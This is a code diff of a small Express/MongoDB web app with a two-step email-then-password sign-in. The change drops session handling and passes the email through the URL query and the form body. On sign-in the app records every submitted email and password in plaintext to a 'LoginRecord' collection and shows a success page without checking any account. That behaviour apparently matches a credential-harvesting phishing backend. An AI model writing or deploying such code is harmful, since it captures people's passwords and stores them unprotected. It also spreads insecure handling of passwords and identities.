@@ -1,7 +1,6 @@
 require("dotenv").config();
 const path = require("path");
 const express = require("express");
-const session = require("express-session");
 const mongoose = require("mongoose");
 
 const app = express();
@@ -22,14 +21,6 @@ app.set("view engine", "ejs");
 app.set("views", path.join(__dirname, "views"));
 
 app.use(express.urlencoded({ extended: true }));
-app.use(
-  session({
-    secret: process.env.SESSION_SECRET || "school-project-secret",
-    resave: false,
-    saveUninitialized: false,
-    cookie: { maxAge: 10 * 60 * 1000 },
-  })
-);
 app.use(express.static(path.join(__dirname, "public")));
 
 let dbPromise;
@@ -74,12 +65,11 @@ app.post("/next", (req, res) => {
     });
   }
 
-  req.session.pendingEmail = email;
-  return res.redirect("/password");
+  return res.redirect(`/password?email=${encodeURIComponent(email)}`);
 });
 
 app.get("/password", (req, res) => {
-  const email = req.session.pendingEmail;
+  const email = (req.query.email || "").trim();
   if (!email) {
     return res.redirect("/");
   }
@@ -88,7 +78,7 @@ app.get("/password", (req, res) => {
 });
 
 app.post("/signin", async (req, res) => {
-  const email = req.session.pendingEmail;
+  const email = (req.body.email || "").trim();
   const password = (req.body.password || "").trim();
 
   if (!email) {
@@ -105,7 +95,6 @@ app.post("/signin", async (req, res) => {
   try {
     await connectToDatabase();
     await LoginRecord.create({ email, password });
-    req.session.pendingEmail = null;
     return res.render("success", { email });
   } catch (error) {
     console.error("MongoDB save failed:", error.message);
